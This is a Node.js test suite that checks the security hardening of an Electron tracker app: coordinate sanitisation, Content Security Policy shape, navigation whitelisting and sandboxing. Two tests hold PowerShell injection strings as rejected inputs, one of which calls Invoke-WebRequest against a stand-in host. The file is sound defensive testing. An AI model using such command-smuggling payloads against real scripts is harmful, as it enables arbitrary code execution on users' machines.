/* Main-process hardening: coordinate sanitisation, CSP shape, navigation guards. */
const test = require('node:test');
const assert = require('node:assert');
const fs = require('fs');
const path = require('path');

const MAIN = path.join(__dirname, '..', 'src', 'main', 'main.js');
const source = () => fs.readFileSync(MAIN, 'utf8');

function slice(src, marker, endMarker) {
    const start = src.indexOf(marker);
    if (start === -1) throw new Error(`marker not found: ${marker}`);
    const end = src.indexOf(endMarker, start);
    if (end === -1) throw new Error(`end marker not found: ${endMarker}`);
    return src.slice(start, end + endMarker.length);
}

function loadSanitizer() {
    const fn = slice(source(), 'function sanitizeClickCoordinate', '\n}');
    return new Function(`${fn}; return sanitizeClickCoordinate;`)();
}

function loadCsp(apiBase) {
    const src = source();
    const block =
        slice(src, 'function allowedConnectOrigins', '\n}') + '\n' +
        slice(src, 'function contentSecurityPolicy', '\n}');
    return new Function('config', 'console', 'URL', `${block}; return contentSecurityPolicy();`)(
        { API_BASE: apiBase }, { warn() {} }, URL
    );
}

test('coordinates that are not finite numbers are rejected', () => {
    const sanitize = loadSanitizer();
    // Number() coerces null, '' and [] to 0, so each of these would have become
    // a silent click at the origin under a coercing check.
    for (const bad of ['0); Start-Process calc; (0', '640', '', NaN, Infinity, -Infinity, undefined, null, {}, [], [1, 2]]) {
        assert.strictEqual(sanitize(bad, 1920), null, `should reject ${JSON.stringify(bad)}`);
    }
});

test('a shell metacharacter payload can never reach the script', () => {
    const sanitize = loadSanitizer();
    // The exact shape that would break out of the PowerShell literal.
    assert.strictEqual(sanitize("100); Invoke-WebRequest evil.test; (0", 1920), null);
});

test('numeric coordinates are rounded and clamped to the display', () => {
    const sanitize = loadSanitizer();
    assert.strictEqual(sanitize(10.6, 1920), 11);
    assert.strictEqual(sanitize(-40, 1920), 0);
    assert.strictEqual(sanitize(99999, 1920), 1920);
    assert.strictEqual(sanitize(0, 1920), 0, 'a genuine origin click is still allowed');
});

test('the CSP forbids inline and remote script', () => {
    const csp = loadCsp('https://hrm.omegatrack.ai/api');
    assert.match(csp, /script-src 'self'(;|$)/, "script-src must be 'self' only");
    assert.doesNotMatch(csp, /script-src[^;]*unsafe-inline/);
    assert.doesNotMatch(csp, /script-src[^;]*unsafe-eval/);
    assert.match(csp, /default-src 'none'/);
    assert.match(csp, /object-src 'none'/);
    assert.match(csp, /base-uri 'none'/);
});

test('connect-src is derived from the configured API base', () => {
    const csp = loadCsp('https://self-hosted.example.com/api/v1');
    assert.match(csp, /connect-src[^;]*https:\/\/self-hosted\.example\.com/);
    assert.match(csp, /connect-src[^;]*https:\/\/ipwho\.is/, 'geo-IP fallbacks stay allowed');
});

test('a scheme-less API base still reaches connect-src', () => {
    // This is the shape env.json actually ships.
    const csp = loadCsp('hrm.omegatrack.ai/api');
    assert.match(
        csp, /connect-src[^;]*https:\/\/hrm\.omegatrack\.ai/,
        'the app would block its own API calls if this were dropped'
    );
});

test('the shipped env.json produces a working policy', () => {
    const env = JSON.parse(fs.readFileSync(path.join(__dirname, '..', 'env.json'), 'utf8'));
    const csp = loadCsp(env.API_BASE);
    const connect = csp.split('; ').find((d) => d.startsWith('connect-src'));
    assert.ok(
        connect.split(' ').length > 2,
        'connect-src must name the API origin, not just \'self\' and the geo-IP hosts'
    );
});

test('a malformed API base does not break the policy', () => {
    const csp = loadCsp('not a url');
    assert.match(csp, /connect-src 'self'/);
    assert.match(csp, /script-src 'self'/);
});

test('every renderer view is free of inline script', () => {
    const views = path.join(__dirname, '..', 'src', 'renderer', 'views');
    for (const file of fs.readdirSync(views).filter((f) => f.endsWith('.html'))) {
        const html = fs.readFileSync(path.join(views, file), 'utf8');
        assert.doesNotMatch(html, /<script(?![^>]*\bsrc=)[^>]*>/i, `${file} still has an inline <script>`);
        assert.doesNotMatch(html, /\son(click|change|submit|load|error)=/i, `${file} has an inline handler`);
    }
});

test('navigation is denied by default', () => {
    const src = source();
    assert.match(src, /setWindowOpenHandler/, 'window.open must be intercepted');
    assert.match(src, /action: 'deny'/, 'and denied');
    assert.match(src, /will-navigate/, 'in-app navigation must be guarded');
    assert.match(src, /will-attach-webview/, '<webview> must be blocked');
});

test('the token is written owner-only on both paths', () => {
    const write = slice(source(), "ipcMain.on('set-token'", '\n});');
    const modes = write.match(/mode: 0o600/g) || [];
    assert.strictEqual(modes.length, 2, 'encrypted and fallback writes must both be 0600');
    assert.match(write, /UNENCRYPTED/, 'the downgrade must be stated, not silent');
});

test('every view carries the policy in the document, not just in a header', () => {
    // The main-process CSP is delivered via onHeadersReceived, which file://
    // documents never receive — so for these pages the header was decorative and
    // the app ran with no policy at all. The meta tag is the enforcing one.
    const views = path.join(__dirname, '..', 'src', 'renderer', 'views');
    const files = fs.readdirSync(views).filter((f) => f.endsWith('.html'));
    assert.ok(files.length >= 3, 'expected the login, tracker and reminder views');

    for (const file of files) {
        const html = fs.readFileSync(path.join(views, file), 'utf8');
        const meta = html.match(/<meta\s+http-equiv="Content-Security-Policy"\s+content="([^"]+)"/i);
        assert.ok(meta, `${file} has no document-level CSP`);

        const policy = meta[1];
        assert.match(policy, /default-src 'none'/, `${file}: must deny by default`);
        assert.match(policy, /script-src 'self' file:;/, `${file}: script must be local-only`);
        assert.doesNotMatch(policy, /script-src[^;]*unsafe-inline/, `${file}: inline script must stay banned`);
        assert.doesNotMatch(policy, /script-src[^;]*unsafe-eval/, `${file}: eval must stay banned`);
        assert.doesNotMatch(policy, /script-src[^;]*https:/, `${file}: remote script must stay banned`);
        assert.match(policy, /object-src 'none'/, `${file}: plugins must be blocked`);
        assert.match(policy, /base-uri 'none'/, `${file}: <base> hijacking must be blocked`);
        assert.match(policy, /frame-src 'none'/, `${file}: framing must be blocked`);
    }
});

test('the screenshot path does not depend on fetching a data: URL', () => {
    // fetch() of a data: URL is governed by connect-src, so the previous
    // base64 -> Blob round trip would have been blocked the moment the policy
    // above started applying.
    const renderer = fs.readFileSync(
        path.join(__dirname, '..', 'src', 'renderer', 'js', 'tracker-renderer.js'), 'utf8');
    const upload = slice(renderer, 'async function uploadScreenshot', '\n}');
    assert.doesNotMatch(upload, /await fetch\(base64Image\)/, 'decode inline instead of fetching data:');
    assert.match(upload, /dataUrlToBlob\(base64Image\)/);
});

test('only the bundled views can be navigated to', () => {
    const src = source();
    assert.match(src, /const ALLOWED_VIEWS = new Set\(\['login', 'tracker', 'reminder'\]\)/,
        'the view list must be a whitelist');

    const handler = slice(src, "ipcMain.on('navigate-to'", '\n});');
    const guardAt = handler.indexOf('ALLOWED_VIEWS.has(page)');
    const loadAt = handler.indexOf('loadFile');
    assert.ok(guardAt !== -1, 'the handler must check the whitelist');
    assert.ok(guardAt < loadAt, 'and check it before building any path');
    assert.match(handler, /return;/, 'an unknown view must be refused, not sanitised');
});

test('every window that gets the preload bridge is sandboxed', () => {
    const src = source();
    const preloads = (src.match(/preload: path\.join\(__dirname, 'preload\.js'\)/g) || []).length;
    const sandboxes = (src.match(/sandbox: true/g) || []).length;
    assert.ok(preloads > 0, 'expected at least one window with the bridge');
    assert.strictEqual(sandboxes, preloads,
        'every window carrying electronAPI must run sandboxed');
    assert.doesNotMatch(src, /nodeIntegration: true/);
    assert.doesNotMatch(src, /contextIsolation: false/);
});
